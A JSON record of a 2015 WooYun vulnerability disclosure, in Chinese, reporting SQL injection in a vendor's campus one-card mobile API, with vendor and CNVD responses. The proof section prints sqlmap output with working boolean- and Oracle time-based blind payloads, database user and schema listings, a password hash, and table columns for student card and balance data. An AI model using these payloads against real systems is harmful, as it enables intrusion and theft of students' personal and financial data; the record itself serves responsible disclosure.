{"id": 84705, "wybug_id": "wooyun-2015-0143599", "wybug_title": "某校园一卡通存在SQL注入", "wybug_corp": "哈尔滨新中新电子股份有限公司", "wybug_author": "KaneLin1217", "wybug_date": "2015-10-01 10:24", "wybug_open_date": "2015-11-24 17:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["校园一卡通"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-24：\t细节向公众公开  简要描述： 哈尔滨新中新电子股份有限公司用它的高校还蛮多的，校园内各种 餐厅、浴室 等等都要使用此一卡通消费。然而其存在SQL注入，能看到数据库的内部结构，能读取 数据库管理员 的密文密码，和 网站管理员 的密文密码，还能读取 学生的卡号，姓名，余额 等等敏感信息。 详细说明：  通过抓包，得知 iOS苹果手机 和 Android手机APP 的通讯接口，发现此内部API。注入点： http://**.**.**.**:8070/Api/Account/SignInAndGetUserPlus(POST) account 变量个人猜测：80端口和8050端口是电脑网页登录的端口， 8080端口是校校通电子支付平台，8070端口就是手机端WEB和APP的API   漏洞证明：  \n---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Oraclesqlmap resumed the following injection point(s) from stored session:---Parameter: account (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: account=1500000000' AND 4689=4689 AND 'YeNW'='YeNW&signType=SynSno&simCode=&phone=&password=0000000000000000&cardimsi=&clientType=IOS    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: account=1500000000' AND 2999=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(102)||CHR(85)||CHR(108),5) AND 'jZBM'='jZBM&signType=SynSno&simCode=&phone=&password=0000000000000000&cardimsi=&clientType=IOS---\n服务器环境：web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Oracle数据库用户：database management system users [32]:[*] ANONYMOUS[*] APEX_030200[*] APEX_PUBLIC_USER[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] DIP[*] EXFSYS[*] FLOWS_FILES[*] IDDBUSER[*] MDDATA[*] MDSYS[*] MGMT_VIEW[*] OLAPSYS[*] ORACLE_OC[*] ORDDATA[*] ORDPLUGIN[*] ORDSYS[*] OUTLN[*] OWBSYS[*] OWBSYS_AUDIT[*] SCHOOL[*] SCOTT[*] SI_INFORM[*] SPATIAL_CSW_ADMIN_USR[*] SPATIAL_W????????????[*] SYS[*] SYSMAN[*] SYSTEM[*] WMSYS[*] XDB[*] XS$NULL 数据库内容：available databases [20]:[*] APEX_0302[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EXFSYS[*] FLOWS_FIL[*] HPDOPP[*] IDDBUSER[*] LLAPSYS[*] MDSYS[*] OPBPPP[*] OPDBAPA[*] OPPHH[*] PBB[*] PBHHHJ[*] PBOPP[*] PPP[*] PPPHAM[*] PPPREM[*] TMPYPdatabase ‘IDDBUSER’user ‘IDDBUSER’password hash: D2E100B4376D4D6BDatabase: IDDBUSERTable: N_MANAGER| ID      | STATUS | PASSWD           | USERNAME | UNITNAME |（内容就不给了，这里有 WEB管理员 的用户名和密文密码）Database: IDDBUSERTable: ACCOUNT| PID | CARDID | IDENTITYI | OLDCARDID | IDENTITY   | U | TM | SEX | SNO | FLAG | NAME | PHONE | SUBSEQ | ACCAMT | BANKACC | EBAGAMT | ACCOULT | EXPDATE | RESERVE | SCHCODE | CARDTYPE | QUERYPIN | OPERCODE | DEPTCODE | ENSUREAMT | PRESUBSEQ | TRANLIMIT | CERTIFYTYPE | TRANSFERAMT | CARDBALANCE | DIGITALSIGN | PROCDATETIME | MANAGEFEERATE | PRETMPBALANCE | CREATEDATETIME |这里有学生一卡通的账户信息（卡号，姓名，余额 等等）。   修复方案：  这个嘛，是厂家的程序猿粗心了？自己明白哈~   版权声明：转载请注明来源 KaneLin1217@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-10-10 16:59 厂商回复： CNVD确认所述情况(暂未确认通用性,还需要提供多个实例),由CNVD通过以往联系渠道尝试向软件生产厂商通报. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-08 18:06 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  您好！    感谢您对CNVD的支持，请您协助CNVD提供下测试实例（至少2例）以证明通用性，以便CNVD及时验证、处置，并邮件反馈至vreport@cert.org.cn。    祝好！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}